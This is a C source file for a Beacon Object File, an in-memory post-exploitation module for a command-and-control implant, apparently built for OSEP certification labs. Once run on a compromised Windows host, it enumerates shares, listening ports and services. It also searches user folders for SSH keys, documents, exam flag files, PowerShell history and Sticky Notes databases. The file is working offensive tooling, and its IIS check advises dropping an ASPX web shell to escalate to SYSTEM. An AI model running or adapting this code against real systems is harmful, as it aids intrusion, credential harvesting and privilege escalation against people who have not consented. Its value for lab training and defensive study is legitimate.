/*
 * osep_enum.c — BOF port of OSEP_enum.ps1
 *
 * Sections:
 *   1. Net shares
 *   2. Interesting file types in C:\Users
 *   3. Directory listing (Program Files / ProgramData / C:\)
 *   4. Flag files (local.txt / proof.txt)
 *   5. Listening TCP ports + owning process
 *   6. IIS wwwroot write check
 *   7. Sticky Notes + PowerShell history
 *   8. Services (registry enum)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -o osep_enum.o -c osep_enum.c -masm=intel
 */

#include <windows.h>
#include "beacon.h"

// ─── WIN32 IMPORTS ───────────────────────────────────────────────────────────

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$K32GetProcessImageFileNameW(HANDLE, LPWSTR, DWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);

DECLSPEC_IMPORT int     __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT int     __cdecl MSVCRT$swprintf(wchar_t*, const wchar_t*, ...);
DECLSPEC_IMPORT size_t  __cdecl MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int     __cdecl MSVCRT$wcscmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int     __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcsrchr(const wchar_t*, wchar_t);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);

// ─── STRUCT DEFS (avoid including iphlpapi / lm headers) ─────────────────────

// MIB_TCPROW_OWNER_PID
typedef struct {
    DWORD dwState;
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
    DWORD dwRemoteAddr;
    DWORD dwRemotePort;
    DWORD dwOwningPid;
} _BOF_TCPROW;

typedef struct {
    DWORD      dwNumEntries;
    _BOF_TCPROW table[1];
} _BOF_TCPTABLE;

// TCP_TABLE_OWNER_PID_LISTENER = 4
#define BOF_TCP_OWNER_PID_LISTENER 4

DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetExtendedTcpTable(PVOID, PDWORD, BOOL, ULONG, DWORD, ULONG);

// SHARE_INFO_1
typedef struct {
    LPWSTR shi1_netname;
    DWORD  shi1_type;
    LPWSTR shi1_remark;
} _BOF_SHARE_INFO_1;

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetShareEnum(LPWSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCloseKey(HKEY);

// ─── HELPERS ─────────────────────────────────────────────────────────────────

// Wide to narrow conversion into caller-supplied buffer
static void w2a(const wchar_t* wide, char* out, int outSz) {
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, wide, -1, out, outSz, NULL, NULL);
}

// Check if a wide filename matches one of a set of extensions.
// exts[] must be terminated with a NULL entry, e.g. { L".txt", L".xml", NULL }
static BOOL matchExt(const wchar_t* filename, const wchar_t** exts) {
    wchar_t* dot = MSVCRT$wcsrchr(filename, L'.');
    if (!dot) return FALSE;
    for (int i = 0; exts[i]; i++) {
        if (MSVCRT$_wcsicmp(dot, exts[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

// Also match exact filenames (for id_rsa, authorized_keys, etc.)
static BOOL matchExact(const wchar_t* filename, const wchar_t** names) {
    for (int i = 0; names[i]; i++) {
        if (MSVCRT$_wcsicmp(filename, names[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

// Recursive file search up to maxDepth.
// Prints any file matching exts or exactNames.
static void searchFilesRec(const wchar_t* dir, const wchar_t** exts,
                            const wchar_t** exactNames, int depth, int maxDepth) {
    if (depth > maxDepth) return;

    wchar_t pattern[MAX_PATH];
    MSVCRT$wcscpy(pattern, dir);
    MSVCRT$wcscat(pattern, L"\\*");

    WIN32_FIND_DATAW fd;
    HANDLE hFind = KERNEL32$FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        // Skip . and ..
        if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
            MSVCRT$wcscmp(fd.cFileName, L"..") == 0)
            continue;

        wchar_t fullPath[MAX_PATH];
        MSVCRT$wcscpy(fullPath, dir);
        MSVCRT$wcscat(fullPath, L"\\");
        MSVCRT$wcscat(fullPath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            searchFilesRec(fullPath, exts, exactNames, depth + 1, maxDepth);
        } else {
            BOOL hit = FALSE;
            if (exts)       hit = matchExt(fd.cFileName, exts);
            if (!hit && exactNames) hit = matchExact(fd.cFileName, exactNames);
            if (hit) {
                char aBuf[MAX_PATH * 2];
                w2a(fullPath, aBuf, sizeof(aBuf));
                BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", aBuf);
            }
        }
    } while (KERNEL32$FindNextFileW(hFind, &fd));

    KERNEL32$FindClose(hFind);
}

// Print one level of subdirectories under a given path
static void listDirs(const wchar_t* path) {
    wchar_t pattern[MAX_PATH];
    MSVCRT$wcscpy(pattern, path);
    MSVCRT$wcscat(pattern, L"\\*");

    WIN32_FIND_DATAW fd;
    HANDLE hFind = KERNEL32$FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        char aBuf[MAX_PATH];
        w2a(path, aBuf, sizeof(aBuf));
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] Cannot open: %s\n", aBuf);
        return;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
            MSVCRT$wcscmp(fd.cFileName, L"..") == 0)
            continue;

        char aName[MAX_PATH];
        w2a(fd.cFileName, aName, sizeof(aName));
        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", aName);
    } while (KERNEL32$FindNextFileW(hFind, &fd));

    KERNEL32$FindClose(hFind);
}

// ─── SECTION 1: NET SHARES ───────────────────────────────────────────────────

static void enumShares(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[1] NETWORK SHARES\n"
        "========================================\n");

    LPBYTE buf = NULL;
    DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;

    DWORD ret = NETAPI32$NetShareEnum(
        NULL, 1, &buf, (DWORD)-1,
        &entriesRead, &totalEntries, &resumeHandle);

    if (ret != 0 && ret != 234 /*ERROR_MORE_DATA*/) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] NetShareEnum failed: %lu\n", ret);
        return;
    }

    _BOF_SHARE_INFO_1* shares = (_BOF_SHARE_INFO_1*)buf;
    for (DWORD i = 0; i < entriesRead; i++) {
        char aName[256], aRemark[256];
        w2a(shares[i].shi1_netname, aName,   sizeof(aName));
        w2a(shares[i].shi1_remark,  aRemark, sizeof(aRemark));
        BeaconPrintf(CALLBACK_OUTPUT,
            "  %-20s  Type: %lu  Remark: %s\n",
            aName, shares[i].shi1_type, aRemark);
    }

    if (buf) NETAPI32$NetApiBufferFree(buf);
}

// ─── SECTION 2: INTERESTING FILES IN C:\USERS ────────────────────────────────

static void searchInterestingFiles(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[2] INTERESTING FILES IN C:\\Users\n"
        "  (xml, txt, pdf, xls/xlsx, doc/docx, log, exe, id_rsa, authorized_keys)\n"
        "========================================\n");

    const wchar_t* exts[] = {
        L".xml", L".txt", L".pdf", L".xls", L".xlsx",
        L".doc", L".docx", L".log", L".exe", NULL
    };
    const wchar_t* exact[] = {
        L"id_rsa", L"authorized_keys", NULL
    };

    searchFilesRec(L"C:\\Users", exts, exact, 0, 6);
}

// ─── SECTION 3: DIRECTORY LISTINGS ───────────────────────────────────────────

static void listDirectories(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[3] DIRECTORY LISTINGS\n"
        "========================================\n");

    const wchar_t* paths[] = {
        L"C:\\Program Files",
        L"C:\\Program Files (x86)",
        L"C:\\ProgramData",
        L"C:\\",
        NULL
    };

    for (int i = 0; paths[i]; i++) {
        char aBuf[MAX_PATH];
        w2a(paths[i], aBuf, sizeof(aBuf));
        BeaconPrintf(CALLBACK_OUTPUT, "\n  [%s]\n", aBuf);
        listDirs(paths[i]);
    }
}

// ─── SECTION 4: FLAG FILES ────────────────────────────────────────────────────

static void findFlags(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[4] FLAG FILES (local.txt / proof.txt)\n"
        "========================================\n");

    const wchar_t* exact[] = { L"local.txt", L"proof.txt", NULL };

    // C:\ root only — don't recurse into subdirs
    searchFilesRec(L"C:\\", NULL, exact, 0, 0);

    // C:\Users full depth
    searchFilesRec(L"C:\\Users", NULL, exact, 0, 6);
}

// ─── SECTION 5: LISTENING TCP PORTS ──────────────────────────────────────────

static void enumListeningPorts(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[5] LISTENING TCP PORTS\n"
        "========================================\n");

    DWORD tableSize = 0;
    // First call to get required size
    IPHLPAPI$GetExtendedTcpTable(NULL, &tableSize, FALSE, AF_INET,
                                  BOF_TCP_OWNER_PID_LISTENER, 0);

    _BOF_TCPTABLE* table = (_BOF_TCPTABLE*)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, tableSize);
    if (!table) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] HeapAlloc failed\n");
        return;
    }

    DWORD ret = IPHLPAPI$GetExtendedTcpTable(table, &tableSize, FALSE, AF_INET,
                                              BOF_TCP_OWNER_PID_LISTENER, 0);
    if (ret != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] GetExtendedTcpTable failed: %lu\n", ret);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, table);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "  %-22s %-8s  %s\n",
                 "Address:Port", "PID", "Process");
    BeaconPrintf(CALLBACK_OUTPUT, "  %-22s %-8s  %s\n",
                 "------------", "---", "-------");

    for (DWORD i = 0; i < table->dwNumEntries; i++) {
        _BOF_TCPROW* row = &table->table[i];

        // Local address bytes
        BYTE* addr = (BYTE*)&row->dwLocalAddr;
        DWORD port  = ((row->dwLocalPort & 0xFF) << 8) |
                      ((row->dwLocalPort >> 8) & 0xFF);
        DWORD pid   = row->dwOwningPid;

        char addrStr[64];
        MSVCRT$sprintf(addrStr, "%u.%u.%u.%u:%u",
                       addr[0], addr[1], addr[2], addr[3], port);

        // Resolve process name
        char procName[MAX_PATH] = "<unknown>";
        HANDLE hProc = KERNEL32$OpenProcess(
            PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hProc) {
            wchar_t wPath[MAX_PATH];
            if (KERNEL32$K32GetProcessImageFileNameW(hProc, wPath, MAX_PATH)) {
                // Extract just the filename
                wchar_t* slash = MSVCRT$wcsrchr(wPath, L'\\');
                w2a(slash ? slash + 1 : wPath, procName, sizeof(procName));
            }
            KERNEL32$CloseHandle(hProc);
        }

        BeaconPrintf(CALLBACK_OUTPUT, "  %-22s %-8lu  %s\n",
                     addrStr, pid, procName);
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, table);
}

// ─── SECTION 6: IIS WWWROOT WRITE CHECK ──────────────────────────────────────

static void checkIISWrite(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[6] IIS WWWROOT WRITE CHECK\n"
        "========================================\n");

    const wchar_t* testPath = L"C:\\inetpub\\wwwroot\\bof_write_test.tmp";

    // Check if C:\inetpub\wwwroot exists first
    WIN32_FIND_DATAW fd;
    HANDLE hCheck = KERNEL32$FindFirstFileW(L"C:\\inetpub\\wwwroot", &fd);
    if (hCheck == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "  C:\\inetpub\\wwwroot does not exist.\n");
        return;
    }
    KERNEL32$FindClose(hCheck);

    HANDLE hFile = KERNEL32$CreateFileW(
        testPath,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  No write access to C:\\inetpub\\wwwroot.\n");
        return;
    }

    const char* data = "test";
    DWORD written = 0;
    KERNEL32$WriteFile(hFile, data, 4, &written, NULL);
    KERNEL32$CloseHandle(hFile);
    KERNEL32$DeleteFileW(testPath);

    BeaconPrintf(CALLBACK_OUTPUT,
        "  [+] WRITE ACCESS CONFIRMED to C:\\inetpub\\wwwroot\n"
        "      Consider dropping an ASPX shell for SeImpersonate -> SYSTEM.\n");
}

// ─── SECTION 7: STICKY NOTES + PS HISTORY ────────────────────────────────────

static void findStickyAndHistory(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[7] STICKY NOTES + POWERSHELL HISTORY\n"
        "========================================\n");

    // Enumerate user profile directories under C:\Users
    WIN32_FIND_DATAW fd;
    HANDLE hUsers = KERNEL32$FindFirstFileW(L"C:\\Users\\*", &fd);
    if (hUsers == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] Cannot enumerate C:\\Users\n");
        return;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
            MSVCRT$wcscmp(fd.cFileName, L"..") == 0 ||
            MSVCRT$_wcsicmp(fd.cFileName, L"Public") == 0 ||
            MSVCRT$_wcsicmp(fd.cFileName, L"Default") == 0)
            continue;

        wchar_t userDir[MAX_PATH];
        MSVCRT$wcscpy(userDir, L"C:\\Users\\");
        MSVCRT$wcscat(userDir, fd.cFileName);

        // PowerShell history
        wchar_t histPath[MAX_PATH];
        MSVCRT$wcscpy(histPath, userDir);
        MSVCRT$wcscat(histPath,
            L"\\AppData\\Roaming\\Microsoft\\Windows\\"
            L"PowerShell\\PSReadLine\\ConsoleHost_history.txt");

        WIN32_FIND_DATAW fdHist;
        HANDLE hHist = KERNEL32$FindFirstFileW(histPath, &fdHist);
        if (hHist != INVALID_HANDLE_VALUE) {
            char aPath[MAX_PATH * 2];
            w2a(histPath, aPath, sizeof(aPath));
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [PSHistory] %s\n", aPath);
            KERNEL32$FindClose(hHist);
        }

        // Sticky Notes — search the LocalState folder for plum.sqlite or *.sqlite
        wchar_t stickyBase[MAX_PATH];
        MSVCRT$wcscpy(stickyBase, userDir);
        MSVCRT$wcscat(stickyBase,
            L"\\AppData\\Local\\Packages\\"
            L"Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\*");

        WIN32_FIND_DATAW fdSticky;
        HANDLE hSticky = KERNEL32$FindFirstFileW(stickyBase, &fdSticky);
        if (hSticky != INVALID_HANDLE_VALUE) {
            // Build the directory path (strip the \* we added)
            wchar_t stickyDir[MAX_PATH];
            MSVCRT$wcscpy(stickyDir, userDir);
            MSVCRT$wcscat(stickyDir,
                L"\\AppData\\Local\\Packages\\"
                L"Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState");

            do {
                if (fdSticky.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                wchar_t fullSticky[MAX_PATH];
                MSVCRT$wcscpy(fullSticky, stickyDir);
                MSVCRT$wcscat(fullSticky, L"\\");
                MSVCRT$wcscat(fullSticky, fdSticky.cFileName);
                char aStickyPath[MAX_PATH * 2];
                w2a(fullSticky, aStickyPath, sizeof(aStickyPath));
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [StickyNotes] %s\n", aStickyPath);
            } while (KERNEL32$FindNextFileW(hSticky, &fdSticky));
            KERNEL32$FindClose(hSticky);
        }

    } while (KERNEL32$FindNextFileW(hUsers, &fd));

    KERNEL32$FindClose(hUsers);
}

// ─── SECTION 8: SERVICES (REGISTRY) ─────────────────────────────────────────

static void enumServices(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[8] INSTALLED SERVICES (registry)\n"
        "========================================\n");

    HKEY hKey = NULL;
    LONG ret = ADVAPI32$RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services",
        0, KEY_READ, &hKey);

    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [!] RegOpenKeyExW failed: %ld\n", ret);
        return;
    }

    wchar_t name[256];
    DWORD nameLen = 256;
    DWORD index   = 0;

    while (ADVAPI32$RegEnumKeyExW(
               hKey, index++, name, &nameLen,
               NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        char aName[256];
        w2a(name, aName, sizeof(aName));
        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", aName);
        nameLen = 256;
    }

    ADVAPI32$RegCloseKey(hKey);
}

// ─── ENTRY POINT ─────────────────────────────────────────────────────────────

void go(char* args, int len) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n==========================================\n"
        "          OSEP Enumeration BOF\n"
        "==========================================\n");

    enumShares();
    searchInterestingFiles();
    listDirectories();
    findFlags();
    enumListeningPorts();
    checkIISWrite();
    findStickyAndHistory();
    enumServices();

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[*] Enumeration complete.\n");
}
